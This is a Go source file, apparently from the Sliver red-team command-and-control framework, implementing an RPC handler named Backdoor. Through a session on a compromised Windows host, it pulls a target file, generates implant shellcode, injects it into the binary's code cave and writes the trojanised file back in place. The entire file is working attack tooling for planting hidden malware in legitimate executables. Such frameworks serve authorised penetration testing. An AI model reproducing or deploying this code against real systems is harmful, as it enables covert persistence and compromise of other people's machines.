package rpc

import (
	"context"
	"fmt"
	"io/ioutil"

	"github.com/Binject/binjection/bj"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"
	"github.com/bishopfox/sliver/util/encoders"
)

// Backdoor - Inject a sliver payload in a file on the remote system
func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sliverpb.Backdoor, error) {
	resp := &sliverpb.Backdoor{}
	session := core.Sessions.Get(req.Request.SessionID)
	if session.Os != "windows" {
		return nil, fmt.Errorf("%s is currently not supported", session.Os)
	}
	download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   int64(30),
		},
		Path: req.FilePath,
	})
	if err != nil {
		return nil, err
	}
	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			return nil, err
		}
	}

	profiles, err := rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	var p *clientpb.ImplantProfile
	for _, prof := range profiles.Profiles {
		if prof.Name == req.ProfileName {
			p = prof
		}
	}
	if p.GetName() == "" {
		return nil, fmt.Errorf("no profile found for name %s", req.ProfileName)
	}

	if p.Config.Format != clientpb.ImplantConfig_SHELLCODE {
		return nil, fmt.Errorf("please select a profile targeting a shellcode format")
	}

	config := generate.ImplantConfigFromProtobuf(p.Config)
	fPath, err := generate.SliverShellcode(config)

	if err != nil {
		return nil, err
	}

	shellcode, err := ioutil.ReadFile(fPath)
	if err != nil {
		return nil, err
	}

	bjConfig := &bj.BinjectConfig{
		CodeCaveMode: true,
	}
	newFile, err := bj.Binject(download.Data, shellcode, bjConfig)
	if err != nil {
		return nil, err
	}
	uploadGzip := new(encoders.Gzip).Encode(newFile)
	// upload to remote target
	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    req.FilePath,
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   int64(30),
		},
	})
	if err != nil {
		return nil, err
	}

	if upload.Response != nil && upload.Response.Err != "" {
		return nil, fmt.Errorf(upload.Response.Err)
	}

	return resp, nil
}
